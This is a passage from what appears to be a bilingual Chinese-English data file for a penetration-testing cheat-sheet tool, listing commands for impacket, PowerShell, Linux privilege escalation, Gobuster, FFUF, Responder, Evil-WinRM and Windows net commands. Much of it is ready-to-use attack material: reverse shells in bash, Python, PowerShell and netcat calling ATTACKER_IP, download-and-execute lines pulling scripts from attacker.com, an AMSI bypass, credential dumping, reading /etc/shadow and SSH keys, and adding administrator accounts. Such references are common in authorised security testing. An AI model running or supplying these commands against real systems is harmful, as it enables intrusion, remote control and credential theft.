        command: 'secretsdump.py domain/user:password@target_ip',
        description: { zh: '导出所有凭证', en: 'Dump all credentials' },
        platform: 'linux'
      },
      {
        name: 'GetUserSPNs',
        command: 'GetUserSPNs.py domain/user:password -dc-ip dc_ip -request',
        description: { zh: 'Kerberoasting攻击', en: 'Kerberoasting Attack' },
        platform: 'linux'
      },
      {
        name: 'GetNPUsers',
        command: 'GetNPUsers.py domain/ -usersfile users.txt -format hashcat',
        description: { zh: 'AS-REP Roasting攻击', en: 'AS-REP Roasting attack' },
        platform: 'linux'
      },
      {
        name: 'NTLM Relay',
        command: 'ntlmrelayx.py -tf targets.txt -smb2support',
        description: { zh: 'NTLM中继攻击', en: 'NTLM relay attack' },
        platform: 'linux'
      },
      {
        name: 'MSSQL client',
        command: 'mssqlclient.py domain/user:password@target_ip',
        description: { zh: 'MSSQL客户端', en: 'MSSQL client' },
        platform: 'linux'
      },
      {
        name: 'LookupsID',
        command: 'lookupsid.py domain/user:password@target_ip',
        description: { zh: '通过LSA枚举用户', en: 'Enumerate users via LSA' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/SecureAuthCorp/impacket']
  },
  {
    id: 'powershell-pentest',
    name: { zh: 'PowerShell渗透命令', en: 'PowerShell Pentest Commands' },
    description: { zh: 'PowerShell渗透测试常用命令', en: 'Common PowerShell commands for penetration testing' },
    category: { zh: 'Windows渗透', en: 'Windows Penetration' },
    commands: [
      {
        name: { zh: '执行策略绕过', en: 'Execution Policy Bypass' },
        command: 'powershell -ExecutionPolicy Bypass -File script.ps1',
        description: { zh: '绕过执行策略运行脚本', en: 'Bypass execution policy to run a script' },
        syntaxBreakdown: [
          { part: '-ExecutionPolicy Bypass', explanation: { zh: '绕过执行策略', en: 'Bypass execution policy' }, type: 'parameter' }
        ],
        platform: 'windows'
      },
      {
        name: { zh: '远程下载执行', en: 'Remote Download & Execute' },
        command: 'IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")',
        description: { zh: '从远程下载并执行脚本', en: 'Download and execute a script from a remote URL' },
        syntaxBreakdown: [
          { part: 'IEX', explanation: { zh: 'Invoke-Expression，执行字符串', en: 'Invoke-Expression, executes a string as code' }, type: 'command' },
          { part: 'Net.WebClient', explanation: { zh: 'Web客户端类', en: 'Web client class' }, type: 'value' },
          { part: 'DownloadString', explanation: { zh: '下载字符串内容', en: 'Download string content' }, type: 'value' }
        ],
        platform: 'windows'
      },
      {
        name: { zh: '编码执行', en: 'Encoded Execution' },
        command: 'powershell -EncodedCommand BASE64_ENCODED_COMMAND',
        description: { zh: '使用Base64编码执行命令', en: 'Execute a Base64-encoded command' },
        syntaxBreakdown: [
          { part: '-EncodedCommand', explanation: { zh: 'Base64编码的命令', en: 'Base64-encoded command' }, type: 'parameter' }
        ],
        platform: 'windows'
      },
      {
        name: { zh: '获取系统信息', en: 'Get System Info' },
        command: 'Get-ComputerInfo\nsysteminfo\nGet-WmiObject -Class Win32_OperatingSystem',
        description: { zh: '获取系统信息', en: 'Get System Info' },
        platform: 'windows'
      },
      {
        name: { zh: '获取进程', en: 'Get Processes' },
        command: 'Get-Process | Select-Object Name,Id,Path\nGet-WmiObject Win32_Process | Select-Object Name,ProcessId,CommandLine',
        description: { zh: '获取运行进程', en: 'Get running processes' },
        platform: 'windows'
      },
      {
        name: { zh: '获取服务', en: 'Get Services' },
        command: 'Get-Service | Where-Object {$_.Status -eq "Running"}\nGet-WmiObject Win32_Service | Select-Object Name,State,StartName',
        description: { zh: '获取服务信息', en: 'Get service information' },
        platform: 'windows'
      },
      {
        name: { zh: '网络连接', en: 'Network Connections' },
        command: 'Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,OwningProcess\nnetstat -ano',
        description: { zh: '获取网络连接', en: 'Get network connections' },
        platform: 'windows'
      },
      {
        name: { zh: '用户信息', en: 'User Info' },
        command: 'Get-LocalUser\nnet user\nnet localgroup administrators',
        description: { zh: '获取用户信息', en: 'Get user information' },
        platform: 'windows'
      },
      {
        name: { zh: '端口扫描', en: 'Port Scanning' },
        command: '1..1024 | % {Test-NetConnection -Port $_ -ComputerName target_ip}',
        description: { zh: '简单端口扫描', en: 'Simple port scan' },
        platform: 'windows'
      },
      {
        name: { zh: '文件搜索', en: 'File Search' },
        command: 'Get-ChildItem -Path C:\\ -Include *.txt,*.doc,*.xls -Recurse -ErrorAction SilentlyContinue',
        description: { zh: '搜索敏感文件', en: 'Search for sensitive files' },
        platform: 'windows'
      },
      {
        name: { zh: 'AMSI绕过', en: 'AMSI Bypass' },
        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        description: { zh: '绕过AMSI检测', en: 'Bypass AMSI detection' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/darkoperator/Posh-SecMod']
  },
  {
    id: 'linux-privilege',
    name: { zh: 'Linux提权命令', en: 'Linux Privilege Escalation Commands' },
    description: { zh: 'Linux系统提权常用命令', en: 'Common Linux privilege escalation commands' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      {
        name: { zh: '系统信息', en: 'System Info' },
        command: 'uname -a\ncat /etc/issue\ncat /etc/*-release\ncat /proc/version',
        description: { zh: '获取系统版本信息', en: 'Get system version information' },
        platform: 'linux'
      },
      {
        name: { zh: '用户信息', en: 'User Info' },
        command: 'id\nwhoami\nw\nlast\ncat /etc/passwd\ncat /etc/shadow',
        description: { zh: '获取用户信息', en: 'Get user information' },
        platform: 'linux'
      },
      {
        name: { zh: 'SUID文件', en: 'SUID Files' },
        command: 'find / -perm -4000 -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null',
        description: { zh: '查找SUID权限文件', en: 'Find files with the SUID bit set' },
        syntaxBreakdown: [
          { part: '-perm -4000', explanation: { zh: 'SUID权限位', en: 'SUID permission bit' }, type: 'parameter' },
          { part: '-type f', explanation: { zh: '文件类型', en: 'FileType' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'SUDO配置', en: 'SUDO Configuration' },
        command: 'sudo -l\ncat /etc/sudoers',
        description: { zh: '查看SUDO权限配置', en: 'View SUDO permission configuration' },
        platform: 'linux'
      },
      {
        name: { zh: '可写目录', en: 'Writable Directories' },
        command: 'find / -writable -type d 2>/dev/null\nfind / -perm -222 -type d 2>/dev/null',
        description: { zh: '查找可写目录', en: 'FindWritable Directories' },
        platform: 'linux'
      },
      {
        name: { zh: '内核漏洞', en: 'Kernel Exploits' },
        command: 'searchsploit linux kernel $(uname -r)\n./linux-exploit-suggester.sh',
        description: { zh: '搜索内核漏洞', en: 'SearchKernel Exploits' },
        platform: 'linux'
      },
      {
        name: { zh: 'Cron任务', en: 'Cron Jobs' },
        command: 'cat /etc/crontab\nls -la /etc/cron*\ncrontab -l',
        description: { zh: '查看计划任务', en: 'View scheduled tasks' },
        platform: 'linux'
      },
      {
        name: { zh: '环境变量', en: 'Environment Variable' },
        command: 'env\nset\necho $PATH',
        description: { zh: '查看环境变量', en: 'View environment variables' },
        platform: 'linux'
      },
      {
        name: { zh: '敏感文件', en: 'Sensitive Files' },
        command: 'cat /root/.bash_history\ncat ~/.ssh/authorized_keys\ncat /etc/shadow\nfind / -name "*.key" 2>/dev/null',
        description: { zh: '查找敏感文件', en: 'FindSensitive Files' },
        platform: 'linux'
      },
      {
        name: { zh: 'Docker逃逸', en: 'Docker Escape' },
        command: 'cat /proc/1/cgroup\nfdisk -l\ncapsh --print',
        description: { zh: '检测Docker环境', en: 'Detect Docker container environment' },
        platform: 'linux'
      }
    ],
    references: ['https://gtfobins.github.io/']
  },
  {
    id: 'gobuster',
    name: 'Gobuster',
    description: { zh: '目录和子域名爆破工具', en: 'Directory and Subdomain Brute ForceTools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install gobuster',
    commands: [
      {
        name: { zh: '目录爆破', en: 'Directory Brute Force' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt',
        description: { zh: '爆破网站目录', en: 'Brute force website directories' },
        syntaxBreakdown: [
          { part: 'gobuster', explanation: { zh: 'Gobuster工具', en: 'Gobuster tool' }, type: 'command' },
          { part: 'dir', explanation: { zh: '目录爆破模式', en: 'Directory brute force mode' }, type: 'value' },
          { part: '-u', explanation: { zh: '目标URL', en: 'TargetURL' }, type: 'parameter' },
          { part: '-w', explanation: { zh: '字典文件', en: 'DictionaryFile' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '指定扩展名', en: 'Specify Extensions' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt',
        description: { zh: '指定文件扩展名', en: 'Specify file extensions' },
        syntaxBreakdown: [
          { part: '-x', explanation: { zh: '文件扩展名', en: 'File extensions' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '子域名爆破', en: 'Subdomain Brute Force' },
        command: 'gobuster dns -d target.com -w subdomains.txt',
        description: { zh: '爆破子域名', en: 'Brute force subdomains' },
        syntaxBreakdown: [
          { part: 'dns', explanation: { zh: 'DNS爆破模式', en: 'DNS brute force mode' }, type: 'value' },
          { part: '-d', explanation: { zh: '目标域名', en: 'Target domain' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '使用Cookie', en: 'Using Cookie' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt -c "PHPSESSID=xxx"',
        description: { zh: '使用Cookie认证', en: 'Use cookie for authentication' },
        syntaxBreakdown: [
          { part: '-c', explanation: { zh: '设置Cookie', en: 'Set cookie' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '添加Header', en: 'Add Header' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt -H "Authorization: Bearer token"',
        description: { zh: '添加自定义Header', en: 'Add a custom HTTP header' },
        syntaxBreakdown: [
          { part: '-H', explanation: { zh: '添加Header', en: 'Add Header' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '线程设置', en: 'Thread Settings' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt -t 50',
        description: { zh: '设置线程数', en: 'Set thread count' },
        syntaxBreakdown: [
          { part: '-t', explanation: { zh: '线程数', en: 'thread count' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '忽略状态码', en: 'Ignore Status Codes' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt -b 404,403',
        description: { zh: '忽略特定状态码', en: 'Ignore specific status codes' },
        syntaxBreakdown: [
          { part: '-b', explanation: { zh: '黑名单状态码', en: 'Blacklisted status codes' }, type: 'parameter' }
        ],
        platform: 'linux'
      }
    ],
    references: ['https://github.com/OJ/gobuster']
  },
  {
    id: 'burpsuite',
    name: 'Burp Suite',
    description: { zh: 'Web安全测试平台', en: 'Web security testing platform' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: { zh: '下载安装包', en: 'Download the installation package' },
    commands: [
      { name: { zh: '代理设置', en: 'Proxy Settings' }, command: 'Proxy -> Options -> Proxy Listeners -> Add -> Port 8080', description: { zh: '配置代理监听', en: 'Configure proxy listener' }, platform: 'all' },
      { name: { zh: '拦截请求', en: 'Intercept Request' }, command: 'Proxy -> Intercept -> Intercept is on', description: { zh: '开启请求拦截', en: 'Enable request interception' }, platform: 'all' },
      { name: { zh: '发送到Repeater', en: 'Send to Repeater' }, command: '右键 -> Send to Repeater (Ctrl+R)', description: { zh: '发送请求到Repeater', en: 'Send request to Repeater' }, platform: 'all' },
      { name: { zh: '发送到Intruder', en: 'Send to Intruder' }, command: '右键 -> Send to Intruder (Ctrl+I)', description: { zh: '发送请求到Intruder', en: 'Send request to Intruder' }, platform: 'all' },
      { name: { zh: 'Intruder攻击类型', en: 'Intruder Attack Types' }, command: 'Sniper: 单个payload\nBattering ram: 同一payload\nPitchfork: 多个payload并行\nCluster bomb: 多个payload组合', description: { zh: '四种攻击类型说明', en: 'Four attack type descriptions' }, platform: 'all' },
      { name: { zh: '扫描', en: 'Scan' }, command: 'Dashboard -> New Scan -> 选择目标URL', description: { zh: '启动主动扫描', en: 'Start active scanning' }, platform: 'all' },
      { name: { zh: '插件安装', en: 'Plugin Installation' }, command: 'Extender -> BApp Store -> 选择插件 -> Install', description: { zh: '安装BApp插件', en: 'Install BApp plugin' }, platform: 'all' },
      { name: { zh: '导出请求', en: 'Export Request' }, command: '右键 -> Copy to clipboard -> Request', description: { zh: '复制请求内容', en: 'Copy request content' }, platform: 'all' }
    ],
    references: ['https://portswigger.net/burp/documentation']
  },
  {
    id: 'ffuf',
    name: 'FFUF',
    description: { zh: '快速Web模糊测试工具', en: 'Fast web fuzzing tool' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'go install github.com/ffuf/ffuf/v2@latest',
    commands: [
      { name: { zh: '目录爆破', en: 'Directory Brute Force' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt', description: { zh: '基础目录爆破', en: 'Basic directory brute force' }, platform: 'linux' },
      { name: { zh: '指定扩展名', en: 'Specify Extensions' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt', description: { zh: '添加文件扩展名', en: 'AddFile extensions' }, platform: 'linux' },
      { name: { zh: '参数模糊测试', en: 'Parameter Fuzzing' }, command: 'ffuf -u http://target.com/?param=FUZZ -w wordlist.txt', description: { zh: 'GET参数测试', en: 'GET parameter fuzzing' }, platform: 'linux' },
      { name: { zh: 'POST测试', en: 'POST Test' }, command: 'ffuf -u http://target.com -X POST -d "user=FUZZ&pass=test" -w wordlist.txt', description: { zh: 'POST数据测试', en: 'POST data fuzzing' }, platform: 'linux' },
      { name: { zh: 'Header测试', en: 'Header Test' }, command: 'ffuf -u http://target.com -H "Host: FUZZ.target.com" -w wordlist.txt', description: { zh: 'Host头测试', en: 'Host header fuzzing' }, platform: 'linux' },
      { name: { zh: '过滤状态码', en: 'Filter Status Codes' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302', description: { zh: '匹配特定状态码', en: 'Match specific status codes' }, platform: 'linux' },
      { name: { zh: '过滤响应大小', en: 'Filter Response Size' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234', description: { zh: '过滤特定响应大小', en: 'Filter by specific response size' }, platform: 'linux' },
      { name: { zh: '递归扫描', en: 'Recursive Scan' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2', description: { zh: '递归目录扫描', en: 'Recursive directory scan' }, platform: 'linux' }
    ],
    references: ['https://github.com/ffuf/ffuf']
  },
  {
    id: 'responder',
    name: 'Responder',
    description: 'LLMNR/NBT-NS/MDNS Poisoner',
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'apt install responder',
    commands: [
      { name: { zh: '启动监听', en: 'Start Listener' }, command: 'responder -I eth0', description: { zh: '启动Responder监听', en: 'Start Responder listener' }, platform: 'linux' },
      { name: { zh: '分析模式', en: 'Analysis Mode' }, command: 'responder -I eth0 -A', description: { zh: '被动分析模式', en: 'Passive analysis mode' }, platform: 'linux' },
      { name: { zh: 'WPAD攻击', en: 'WPAD Attack' }, command: 'responder -I eth0 -wF', description: { zh: '启用WPAD代理攻击', en: 'Enable WPAD proxy attack' }, platform: 'linux' },
      { name: { zh: 'Finger服务', en: 'Finger Service' }, command: 'responder -I eth0 -f', description: { zh: '启用Finger服务', en: 'Enable Finger service' }, platform: 'linux' },
      { name: { zh: '禁用SMB', en: 'Disable SMB' }, command: 'responder -I eth0 --disable-smb', description: { zh: '禁用SMB服务', en: 'Disable SMB service' }, platform: 'linux' },
      { name: { zh: '查看哈希', en: 'View Hashes' }, command: 'cat /usr/share/responder/logs/*.txt', description: { zh: '查看捕获的哈希', en: 'View captured hashes' }, platform: 'linux' },
      { name: { zh: 'DHCP欺骗', en: 'DHCP Spoofing' }, command: 'responder -I eth0 -D', description: { zh: '启用DHCP欺骗', en: 'Enable DHCP spoofing' }, platform: 'linux' }
    ],
    references: ['https://github.com/lgandx/Responder']
  },
  {
    id: 'evil-winrm',
    name: 'Evil-WinRM',
    description: { zh: 'WinRM远程管理工具', en: 'WinRM remote management tool' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'gem install evil-winrm',
    commands: [
      { name: { zh: '密码连接', en: 'Password Connection' }, command: 'evil-winrm -i target_ip -u user -p password', description: { zh: '使用密码连接', en: 'Connect with password' }, platform: 'linux' },
      { name: { zh: '哈希连接', en: 'Hash Connection' }, command: 'evil-winrm -i target_ip -u user -H ntlm_hash', description: { zh: '使用哈希连接', en: 'Connect using NTLM hash' }, platform: 'linux' },
      { name: { zh: '上传文件', en: 'Upload File' }, command: 'upload local_file remote_path', description: { zh: '上传文件到目标', en: 'Upload File to Target' }, platform: 'linux' },
      { name: { zh: '下载文件', en: 'Download File' }, command: 'download remote_path local_file', description: { zh: '从目标下载文件', en: 'from TargetDownload File' }, platform: 'linux' },
      { name: { zh: '加载脚本', en: 'Load Script' }, command: 'menu\nBypass-4MSI\nInvoke-Mimikatz', description: { zh: '加载PowerShell脚本', en: 'Load PowerShell script' }, platform: 'linux' },
      { name: { zh: '执行命令', en: 'Execute Command' }, command: 'Invoke-Command -ScriptBlock {whoami}', description: { zh: '执行PowerShell命令', en: 'Execute PowerShell command' }, platform: 'linux' }
    ],
    references: ['https://github.com/Hackplayers/evil-winrm']
  },
  {
    id: 'proxychains',
    name: 'ProxyChains',
    description: { zh: '代理链工具', en: 'ProxyChains tool' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'apt install proxychains4',
    commands: [
      { name: { zh: '配置代理', en: 'Configure Proxy' }, command: 'vim /etc/proxychains4.conf\n[ProxyList]\nsocks5 127.0.0.1 1080', description: { zh: '配置SOCKS代理', en: 'Configure SOCKS proxy' }, platform: 'linux' },
      { name: { zh: '使用代理', en: 'Using Proxy' }, command: 'proxychains4 nmap -sT -Pn target_ip', description: { zh: '通过代理运行工具', en: 'Run tools through proxy' }, platform: 'linux' },
      { name: { zh: '动态链', en: 'Dynamic Chain' }, command: 'dynamic_chain\n[ProxyList]\nsocks5 127.0.0.1 1080\nsocks5 127.0.0.1 1081', description: { zh: '动态代理链', en: 'Dynamic proxy chain' }, platform: 'linux' },
      { name: { zh: '严格链', en: 'Strict Chain' }, command: 'strict_chain', description: { zh: '严格按顺序使用代理', en: 'Strict sequential proxy usage' }, platform: 'linux' },
      { name: { zh: '随机链', en: 'Random Chain' }, command: 'random_chain', description: { zh: '随机选择代理', en: 'Random proxy selection' }, platform: 'linux' }
    ],
    references: ['https://github.com/haad/proxychains']
  },
  {
    id: 'bash-reverse',
    name: { zh: 'Bash反弹Shell', en: 'BashReverse Shell' },
    description: { zh: 'Bash反弹Shell命令', en: 'Bash Reverse Shell Commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      { name: { zh: '基础反弹', en: 'Basic Reverse Shell' }, command: 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1', description: { zh: '基础Bash反弹', en: 'Basic Bash reverse shell' }, platform: 'linux' },
      { name: { zh: 'exec反弹', en: 'exec Reverse Shell' }, command: 'exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done', description: { zh: 'exec方式反弹', en: 'exec method reverse shell' }, platform: 'linux' },
      { name: { zh: 'UDP反弹', en: 'UDP Reverse Shell' }, command: 'bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1', description: { zh: 'UDP反弹', en: 'UDP Reverse Shell' }, platform: 'linux' },
      { name: { zh: '编码反弹', en: 'Encoded Reverse Shell' }, command: 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"', description: { zh: 'bash -c执行', en: 'Execute with bash -c' }, platform: 'linux' },
      { name: { zh: '监听命令', en: 'Listener Command' }, command: 'nc -lvnp PORT', description: { zh: 'Netcat监听', en: 'Netcat listener' }, platform: 'linux' }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'python-reverse',
    name: { zh: 'Python反弹Shell', en: 'Python Reverse Shell' },
    description: { zh: 'Python反弹Shell命令', en: 'Python Reverse Shell Commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      { name: { zh: 'Python反弹', en: 'Python Reverse Shell' }, command: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'', description: { zh: 'Python反弹Shell', en: 'Python Reverse Shell' }, platform: 'linux' },
      { name: { zh: 'Python3反弹', en: 'Python3 Reverse Shell' }, command: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'', description: { zh: 'Python3反弹', en: 'Python3 Reverse Shell' }, platform: 'linux' },
      { name: { zh: '短版本', en: 'Short Version' }, command: 'python -c \'import pty;pty.spawn("/bin/bash")\'', description: { zh: '获取完整TTY', en: 'Get a fully interactive TTY' }, platform: 'linux' }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'powershell-reverse',
    name: { zh: 'PowerShell反弹Shell', en: 'PowerShell Reverse Shell' },
    description: { zh: 'PowerShell反弹Shell命令', en: 'PowerShell Reverse Shell Commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      { name: { zh: '基础反弹', en: 'Basic Reverse Shell' }, command: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'ATTACKER_IP\',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"', description: { zh: 'PowerShell反弹', en: 'PowerShell reverse shell' }, platform: 'windows' },
      { name: { zh: 'Base64编码', en: 'Base64 Encoding' }, command: 'powershell -e BASE64_ENCODED_COMMAND', description: { zh: 'Base64编码执行', en: 'Execute Base64-encoded command' }, platform: 'windows' },
      { name: 'PowerCat', command: 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://attacker.com/powercat.ps1\');powercat -c ATTACKER_IP -p PORT -e cmd"', description: { zh: '使用PowerCat', en: 'Use PowerCat for reverse shell' }, platform: 'windows' }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'nc-reverse',
    name: { zh: 'Netcat反弹Shell', en: 'Netcat Reverse Shell' },
    description: { zh: 'Netcat反弹Shell命令', en: 'Netcat Reverse Shell Commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      { name: { zh: '传统反弹', en: 'Traditional Reverse Shell' }, command: 'nc -e /bin/sh ATTACKER_IP PORT', description: { zh: '传统nc反弹', en: 'Traditional nc reverse shell' }, platform: 'linux' },
      { name: { zh: 'OpenBSD反弹', en: 'OpenBSD Reverse Shell' }, command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f', description: { zh: 'OpenBSD nc反弹', en: 'OpenBSD nc reverse shell' }, platform: 'linux' },
      { name: { zh: '监听模式', en: 'Listener Mode' }, command: 'nc -lvnp PORT', description: { zh: '监听连接', en: 'Listen for incoming connections' }, platform: 'linux' },
      { name: { zh: '文件传输', en: 'File Transfer' }, command: 'nc -lvnp PORT < file    # 发送端\nnc ATTACKER_IP PORT > file    # 接收端', description: { zh: '通过nc传输文件', en: 'Transfer files via nc' }, platform: 'linux' }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'nuclei',
    name: 'Nuclei',
    description: { zh: '快速漏洞扫描工具', en: 'Fast vulnerability scanning tool' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest',
    commands: [
      { name: { zh: '基础扫描', en: 'Basic Scan' }, command: 'nuclei -u http://target.com', description: { zh: '使用所有模板扫描', en: 'Scan with all templates' }, platform: 'linux' },
      { name: { zh: '指定模板', en: 'Specify Template' }, command: 'nuclei -u http://target.com -t cves/', description: { zh: '使用CVE模板', en: 'Use CVE templates' }, platform: 'linux' },
      { name: { zh: '严重级别', en: 'Severity Level' }, command: 'nuclei -u http://target.com -severity critical,high', description: { zh: '指定漏洞严重级别', en: 'Specify vulnerability severity' }, platform: 'linux' },
      { name: { zh: '批量扫描', en: 'Batch Scan' }, command: 'nuclei -l urls.txt', description: { zh: '从文件读取目标', en: 'Read targets from file' }, platform: 'linux' },
      { name: { zh: '更新模板', en: 'Update Templates' }, command: 'nuclei -update-templates', description: { zh: '更新模板库', en: 'Update template library' }, platform: 'linux' },
      { name: { zh: '输出结果', en: 'Output Results' }, command: 'nuclei -u http://target.com -o results.txt', description: { zh: '保存扫描结果', en: 'Save scan results' }, platform: 'linux' },
      { name: { zh: 'JSON输出', en: 'JSON Output' }, command: 'nuclei -u http://target.com -json -o results.json', description: { zh: 'JSON格式输出', en: 'JSON format output' }, platform: 'linux' }
    ],
    references: ['https://nuclei.projectdiscovery.io/']
  },
  {
    id: 'windows-cmd',
    name: { zh: 'Windows CMD命令', en: 'Windows CMDCommand' },
    description: { zh: 'Windows系统常用命令', en: 'Common Windows system commands' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: '系统信息', en: 'System Info' }, command: 'systeminfo\nver\nhostname', description: { zh: '获取系统信息', en: 'Get System Info' }, platform: 'windows' },
      { name: { zh: '用户管理', en: 'User Management' }, command: 'net user\nnet user username password /add\nnet localgroup administrators username /add', description: { zh: '用户管理命令', en: 'User management commands' }, platform: 'windows' },
      { name: { zh: '网络配置', en: 'Network Configuration' }, command: 'ipconfig /all\nnetstat -ano\nnetstat -anob\nroute print\narp -a', description: { zh: '网络配置信息', en: 'Network configuration information' }, platform: 'windows' },
      { name: { zh: '进程管理', en: 'Process Management' }, command: 'tasklist\ntaskkill /PID pid /F\nwmic process list full', description: { zh: '进程管理命令', en: 'Process management commands' }, platform: 'windows' },
      { name: { zh: '服务管理', en: 'Service Management' }, command: 'sc query\nsc start servicename\nsc stop servicename\nnet start', description: { zh: '服务管理命令', en: 'Service management commands' }, platform: 'windows' },
      { name: { zh: '文件操作', en: 'File Operations' }, command: 'dir /s /b c:\\*.txt\ntype filename\nfind "string" filename\nicacls filename', description: { zh: '文件操作命令', en: 'File operation commands' }, platform: 'windows' },
      { name: { zh: '注册表操作', en: 'Registry Operations' }, command: 'reg query HKLM\\Software\nreg add HKLM\\Software\\MyKey /v Value /t REG_SZ /d "Data" /f\nreg delete HKLM\\Software\\MyKey /f', description: { zh: '注册表操作', en: 'Registry Operations' }, platform: 'windows' },
      { name: { zh: '防火墙', en: 'Firewall' }, command: 'netsh advfirewall show allprofiles\nnetsh advfirewall firewall add rule name="Allow Port" dir=in action=allow protocol=tcp localport=8080', description: { zh: '防火墙配置', en: 'Firewall configuration' }, platform: 'windows' }
    ],
    references: ['https://ss64.com/nt/']
  },
  {
    id: 'net-commands',
    name: { zh: 'NET命令集合', en: 'NET Command Collection' },
    description: { zh: 'Windows NET命令完整集合', en: 'Complete Windows NET command collection' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: '用户列表', en: 'User List' }, command: 'net user', description: { zh: '列出所有用户', en: 'List all users' }, platform: 'windows' },
      { name: { zh: '用户详情', en: 'User Details' }, command: 'net user username', description: { zh: '查看用户详细信息', en: 'View detailed user information' }, platform: 'windows' },
      { name: { zh: '添加用户', en: 'Add User' }, command: 'net user username password /add', description: { zh: '添加新用户', en: 'Add a new user' }, platform: 'windows' },
      { name: { zh: '删除用户', en: 'Delete User' }, command: 'net user username /delete', description: { zh: '删除用户', en: 'Delete User' }, platform: 'windows' },
      { name: { zh: '组列表', en: 'Group List' }, command: 'net localgroup', description: { zh: '列出所有本地组', en: 'List all local groups' }, platform: 'windows' },
      { name: { zh: '添加到管理员组', en: 'Add to Admin Group' }, command: 'net localgroup administrators username /add', description: { zh: '将用户添加到管理员组', en: 'Add user to Administrators group' }, platform: 'windows' },
      { name: { zh: '域用户', en: 'Domain Users' }, command: 'net user /domain', description: { zh: '列出域用户', en: 'List domain users' }, platform: 'windows' },
      { name: { zh: '域管理员', en: 'Domain Admins' }, command: 'net group "Domain Admins" /domain', description: { zh: '列出域管理员', en: 'List domain admins' }, platform: 'windows' },
      { name: { zh: '共享列表', en: 'Share List' }, command: 'net share', description: { zh: '列出共享资源', en: 'List shared resources' }, platform: 'windows' },
      { name: { zh: '创建共享', en: 'Create Share' }, command: 'net share sharename=C:\\path /grant:everyone,full', description: { zh: '创建共享', en: 'Create Share' }, platform: 'windows' },
      { name: { zh: '会话列表', en: 'Session List' }, command: 'net session', description: { zh: '列出当前会话', en: 'List current sessions' }, platform: 'windows' },
      { name: { zh: '连接共享', en: 'Connect to Share' }, command: 'net use \\\\target\\share password /user:domain\\user', description: { zh: '连接网络共享', en: 'Connect to network share' }, platform: 'windows' }
    ],
    references: ['https://ss64.com/nt/']
  },
  {
    id: 'mimikatz-tool',
    name: 'Mimikatz',
    description: { zh: 'Windows凭证提取工具', en: 'Windows credential extraction tool' },
